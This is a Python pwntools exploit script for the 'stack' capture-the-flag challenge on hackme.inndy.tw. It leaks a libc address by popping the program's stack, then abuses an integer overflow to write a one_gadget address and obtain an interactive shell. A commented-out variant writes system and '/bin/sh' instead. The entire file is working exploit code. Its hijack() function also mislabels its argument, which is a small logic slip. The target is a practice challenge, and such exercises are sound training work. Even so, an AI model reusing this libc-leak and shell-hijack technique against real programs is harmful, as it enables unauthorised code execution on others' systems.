#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level='debug'
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./stack")
    elf = ELF("./stack")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    one_gadget_offset = 0x3a9fc

else:
    io = remote("hackme.inndy.tw", 7716)
    elf = ELF("./stack")
    libc = ELF("./libc-2.23.so.i386")
    one_gadget_offset = 0x3ac3c

def debug():
    raw_input("DEBUG: ")
    gdb.attach(io)

def getBase():
    #  debug()
    for i in xrange(15):
        io.sendlineafter("Cmd >>", "p")
        io.recvuntil("-> ")

    libc_base = (int(io.recvuntil("\n", drop = True)) & 0xffffffff) - libc.symbols["_IO_2_1_stdout_"]
    info("libc_base -> 0x%x" % libc_base)
    one_gadget = libc_base + one_gadget_offset

    return one_gadget
    #  return libc_base

def hijack(libc_base):
    sys_addr = libc_base + libc.symbols["system"]
    info("sys_addr -> 0x%x" % sys_addr)
    sh_addr = libc_base + next(libc.search("/bin/sh"))
    info("sh_addr -> 0x%x" % sh_addr)

    io.sendlineafter("Cmd >>", "c")

    for i in xrange(8):
        io.sendlineafter("Cmd >>", "p")
        io.recvuntil("-> ")

    io.sendlineafter("Cmd >>", "i %s" %(one_gadget - 0xffffffff + 1))


    #Interger Overflow
    #write /bin/sh
    #  for i in xrange(6):
        #  io.sendlineafter("Cmd >>", "p")
        #  io.recvuntil("-> ")

    #  io.sendlineafter("Cmd >>", "f")
    #  io.sendlineafter("Cmd >>", "i %s" % sh_addr)

    #  #write system
    #  for i in xrange(3):
        #  io.sendlineafter("Cmd >>", "p")
        #  io.recvuntil("-> ")

    #  #  debug()
    #  io.sendlineafter("Cmd >>", "f")
    #  io.sendlineafter("Cmd >>", "i %s" % sys_addr)

if __name__ == "__main__":
    one_gadget = getBase()
    #  libc_base = getBase()
    hijack(one_gadget)
    io.interactive()
    io.close()
